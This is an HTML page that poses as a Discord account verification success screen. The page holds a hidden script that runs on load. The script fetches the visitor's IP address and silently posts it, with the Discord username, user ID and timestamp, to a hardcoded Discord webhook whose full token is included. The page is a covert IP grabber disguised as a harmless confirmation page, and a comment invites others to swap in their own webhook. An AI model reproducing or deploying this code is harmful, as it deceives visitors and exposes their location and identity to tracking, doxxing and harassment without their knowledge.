<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Verification Complete</title>
  <style>
    body {
      background-color: #000000;
      color: #FFFFFF;
      font-family: Arial, sans-serif;
      text-align: center;
      padding: 120px 20px;
    }
    h1 { color: #00FF00; font-size: 50px; }
    p { font-size: 22px; margin: 15px 0; }
  </style>
</head>
<body>
  <h1>✅ Verification Complete</h1>
  <p>You have successfully verified your account.</p>
  <p>You can now return to the Discord server.</p>

  <script>
    const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1521304967267352748/98SDkrBuIZ-vadcFIYGt5-igYech7LvaLnbGL1xnU1vJbprTRNyN_SWOLfH297O3KVwe"; // ← Change this

    const urlParams = new URLSearchParams(window.location.search);
    const userId = urlParams.get('user_id') || 'unknown';
    const username = urlParams.get('username') || 'unknown';

    fetch('https://api.ipify.org?format=json')
      .then(res => res.json())
      .then(data => {
        const ip = data.ip;
        fetch(WEBHOOK_URL, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            embeds: [{
              title: "🔍 Verification Log",
              color: 0x00FF00,
              fields: [
                { name: "Discord Username", value: username, inline: true },
                { name: "User ID", value: userId, inline: true },
                { name: "IP Address", value: ip, inline: true },
                { name: "Time", value: new Date().toLocaleString(), inline: true }
              ]
            }]
          })
        });
      })
      .catch(() => {});
  </script>
</body>
</html>
